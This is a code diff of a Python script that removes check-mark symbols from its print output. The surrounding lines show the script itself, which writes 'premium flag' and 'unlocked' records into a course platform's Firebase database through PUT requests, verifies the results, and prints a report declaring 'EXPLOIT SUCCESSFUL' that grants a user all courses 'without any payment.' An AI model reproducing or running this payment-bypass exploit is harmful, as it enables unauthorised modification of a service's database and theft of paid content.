@@ -42,9 +42,9 @@ for source in course_sources:
             if data:
                 if isinstance(data, dict):
                     all_courses.update(data)
-                print(f"  ✓ Found {len(data) if isinstance(data, dict) else 'data'} courses")
+                print(f"   Found {len(data) if isinstance(data, dict) else 'data'} courses")
     except Exception as e:
-        print(f"  ✗ Error: {e}")
+        print(f"   Error: {e}")
     print()
 
 # Also try to get course IDs from live_class_status
@@ -62,7 +62,7 @@ try:
 except:
     pass
 
-print(f"\n✓ Total unique courses found: {len(all_courses)}")
+print(f"\n Total unique courses found: {len(all_courses)}")
 print()
 
 # Save course list
@@ -118,7 +118,7 @@ for path in [
     try:
         r = requests.put(path, json=premium_data, timeout=10)
         if r.status_code == 200:
-            print(f"  ✓ Set premium flag: {path}")
+            print(f"   Set premium flag: {path}")
     except:
         pass
 
@@ -152,14 +152,14 @@ for course_id in all_courses.keys():
             pass
     
     if success_count > 0:
-        print(f"✓ SUCCESS ({success_count}/{len(firebase_strategies)} paths)")
+        print(f" SUCCESS ({success_count}/{len(firebase_strategies)} paths)")
         unlocked_courses.append({
             "course_id": course_id,
             "success_paths": success_count,
             "timestamp": timestamp
         })
     else:
-        print("✗ FAILED")
+        print(" FAILED")
         failed_courses.append(course_id)
 
 print()
@@ -167,8 +167,8 @@ print("="*80)
 print("UNLOCK COMPLETE")
 print("="*80)
 print()
-print(f"✓ Successfully unlocked: {len(unlocked_courses)} courses")
-print(f"✗ Failed to unlock: {len(failed_courses)} courses")
+print(f" Successfully unlocked: {len(unlocked_courses)} courses")
+print(f" Failed to unlock: {len(failed_courses)} courses")
 print()
 
 # Step 3: Verify unlocks
@@ -190,7 +190,7 @@ for course in unlocked_courses[:10]:  # Verify first 10
             if r.status_code == 200:
                 data = r.json()
                 if data and data.get('unlocked'):
-                    print(f"  ✓ Confirmed in {strategy['name']}")
+                    print(f"   Confirmed in {strategy['name']}")
                     verification_results.append({
                         "course_id": cid,
                         "verified": True,
@@ -258,7 +258,7 @@ with open(output / "unlocked_courses.json", "w") as f:
 with open(output / "failed_courses.json", "w") as f:
     json.dump(failed_courses, f, indent=2)
 
-print("✓ Audit report saved")
+print(" Audit report saved")
 print()
 
 # Create human-readable summary
@@ -275,10 +275,10 @@ OPERATION: Unlock All Courses via Firebase Exploit
 RESULTS SUMMARY
 ================================================================================
 
-✓ Total Courses Found: {len(all_courses)}
-✓ Successfully Unlocked: {len(unlocked_courses)}
-✗ Failed to Unlock: {len(failed_courses)}
-✓ Verified Working: {len(verification_results)}
+ Total Courses Found: {len(all_courses)}
+ Successfully Unlocked: {len(unlocked_courses)}
+ Failed to Unlock: {len(failed_courses)}
+ Verified Working: {len(verification_results)}
 
 Success Rate: {(len(unlocked_courses)/len(all_courses)*100):.1f}%
 
@@ -338,7 +338,7 @@ Files:
 VERDICT
 ================================================================================
 
-✓✓✓ EXPLOIT SUCCESSFUL ✓✓✓
+ EXPLOIT SUCCESSFUL 
 
 The Firebase database has been successfully modified to grant user {USER_ID}
 premium access to ALL {len(unlocked_courses)} courses without any payment.
